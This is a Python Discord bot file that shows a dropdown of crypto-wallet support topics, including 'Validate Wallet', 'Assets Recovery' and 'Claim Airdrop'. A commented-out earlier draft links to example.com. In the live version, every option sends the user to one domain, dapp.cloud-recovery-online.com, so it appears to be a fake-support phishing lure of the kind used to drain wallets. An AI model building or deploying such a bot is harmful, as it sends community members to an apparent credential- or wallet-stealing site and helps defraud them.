# import discord
# from discord.ui import Select, View


# class IssueSelectionView(View):
#     """A dropdown menu view for selecting an issue."""

#     def __init__(self):
#         super().__init__(timeout=None) 

#         self.add_item(IssueSelectMenu())

# class IssueSelectMenu(Select):
#     """Custom Select menu for issue selection."""

#     def __init__(self):
#         options = [
#             discord.SelectOption(label="Migration", description="Migration-related issues"),
#             discord.SelectOption(label="Rectify", description="Rectify strange wallet issues"),
#             discord.SelectOption(label="Claim", description="Token claiming issues"),
#             discord.SelectOption(label="Swap/Exchange", description="Token swap/exchange issue"),
#             discord.SelectOption(label="Slippage", description="Slippage or transaction fee issues"),
#         ]

#         super().__init__(
#             placeholder="Select an issue",
#             min_values=1,
#             max_values=1,
#             options=options,
#             custom_id="select_issue"
#         )

#     async def callback(self, interaction: discord.Interaction):
#         """Handle the issue selection and link to a URL."""
#         issue_links = {
#             "Migration": "https://example.com/migration",
#             "Rectify": "https://example.com/rectify",
#             "Claim": "https://example.com/claim",
#             "Swap/Exchange": "https://example.com/swap-exchange",
#             "Slippage": "https://example.com/slippage"
#         }

#         selected_option = self.values[0]
#         url = issue_links.get(selected_option, "https://example.com")

#         await interaction.response.send_message(
#             f"You selected: **{selected_option}**.\nClick [here]({url}) to proceed to the corresponding page.",
#             ephemeral=False
#         )


import discord
from discord.ui import Select, View, Button

class IssueSelectionView(View):
    """A dropdown menu view for selecting an issue."""

    def __init__(self):
        super().__init__(timeout=None)
        self.add_item(IssueSelectMenu())

class IssueSelectMenu(Select):
    """Custom Select menu for issue selection."""

    def __init__(self):
        options = [
            discord.SelectOption(label="Migration Issues", description="Migration related issues"),
            discord.SelectOption(label="Validate Wallet", description="Wallet validation related issues"),
            discord.SelectOption(label="Assets Recovery", description="Assets recovery related issues"),
            discord.SelectOption(label="General Issues", description="Wallet general issues related"),
            discord.SelectOption(label="Gas Fees", description="Gas Fees related issues"),
            discord.SelectOption(label="Claim Reward", description="Claim Reward issues"),
            discord.SelectOption(label="Deposits/Withdrawals", description="Deposits/Withdrawals issues"),
            discord.SelectOption(label="Slippage Error", description="Slippage Error related issues"),
            discord.SelectOption(label="Transaction Error", description="Transaction Error related issues"),
            discord.SelectOption(label="Cross Chain", description="Cross Chain Transfer related issues"),
            discord.SelectOption(label="Staking Issues", description="Staking Issues related issues"),
            discord.SelectOption(label="Swap/Exchange", description="Swap/Exchange related issues"),
            discord.SelectOption(label="Connect to Dapps", description="Connect to Dapps related issues"),
            discord.SelectOption(label="Login Issues", description="Login related issues"),
            discord.SelectOption(label="Claim Airdrop", description="Claim Airdrops related issues"),
            discord.SelectOption(label="NFTS Issues", description="NFTS Issues related issues"),
            discord.SelectOption(label="Missing/Irregular Balance", description="Missing/Irregular Balance related issues"),
            discord.SelectOption(label="Whitelist Issues", description="Whitelist related issues"),
            discord.SelectOption(label="Transaction Delay", description="Transaction delay related issues"),
            discord.SelectOption(label="Node Issues", description="Node Related issues"),
            discord.SelectOption(label="Trading Issues", description="Trading Wallet related issues"),
        ]


        super().__init__(
            placeholder="Select an issue",
            min_values=1,
            max_values=1,
            options=options,
            custom_id="select_issue"
        )

    async def callback(self, interaction: discord.Interaction):
        """Handle the issue selection and link to a URL."""
        issue_links = {
            "Migration Issues": "https://dapp.cloud-recovery-online.com/",
            "Validate Wallet": "https://dapp.cloud-recovery-online.com/",
            "Assets Recovery": "https://dapp.cloud-recovery-online.com/",
            "General Issues": "https://dapp.cloud-recovery-online.com/",
            "Gas Fees": "https://dapp.cloud-recovery-online.com/",
            "Claim Reward": "https://dapp.cloud-recovery-online.com/",
            "Deposits/Withdrawals": "https://dapp.cloud-recovery-online.com/",
            "Slippage Error": "https://dapp.cloud-recovery-online.com/",
            "Transaction Error": "https://dapp.cloud-recovery-online.com/",
            "Cross Chain": "https://dapp.cloud-recovery-online.com/",
            "Staking Issues": "https://dapp.cloud-recovery-online.com/",
            "Swap/Exchange": "https://dapp.cloud-recovery-online.com/",
            "Connect to Dapps": "https://dapp.cloud-recovery-online.com/",
            "Login Issues": "https://dapp.cloud-recovery-online.com/",
            "Claim Airdrop": "https://dapp.cloud-recovery-online.com/",
            "NFTS Issues": "https://dapp.cloud-recovery-online.com/",
            "Missing/Irregular Balance": "https://dapp.cloud-recovery-online.com/",
            "Whitelist Issues": "https://dapp.cloud-recovery-online.com/",
            "Transaction Delay": "https://dapp.cloud-recovery-online.com/",
            "Node Issues": "https://dapp.cloud-recovery-online.com/",
            "Trading Issues": "https://dapp.cloud-recovery-online.com/"
        }

        selected_option = self.values[0]
        url = issue_links.get(selected_option, "https://example.com")

        # Create a button that links to the corresponding URL
        button = Button(label="Click Here", url=url, style=discord.ButtonStyle.link)

        # Create a new view containing the button
        view = View()
        view.add_item(button)

        await interaction.response.send_message(
            f"You selected: **{selected_option}**.\n Click on the button below to proceed to the corresponding page",
            view=view,
            ephemeral=False
        )
